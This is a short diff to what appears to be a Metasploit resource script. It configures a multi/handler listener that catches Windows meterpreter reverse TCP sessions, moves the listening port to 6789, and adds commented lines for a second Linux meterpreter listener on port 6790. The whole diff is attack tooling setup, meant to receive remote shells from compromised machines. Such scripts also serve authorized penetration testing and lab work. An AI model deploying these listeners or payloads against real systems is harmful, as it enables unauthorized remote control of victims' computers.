@@ -7,9 +7,16 @@ setg payload windows/meterpreter/reverse_tcp
 # setg RHOSTS 114.5.1.4
 
 use multi/handler
+# set payload windows/meterpreter/reverse_tcp
 set ExitOnSession false
 set LHOST 0.0.0.0 
-set LPORT 4443
+set LPORT 6789
+
+# uncomment this for Automatically creating a job listener background with multi listeners
+# run -j
+# set payload linux/x64/meterpreter/reverse_tcp
+# set LPORT 6790
+# 
 
 # uncomment this for Automatically creating a job listener background
 # run -j 
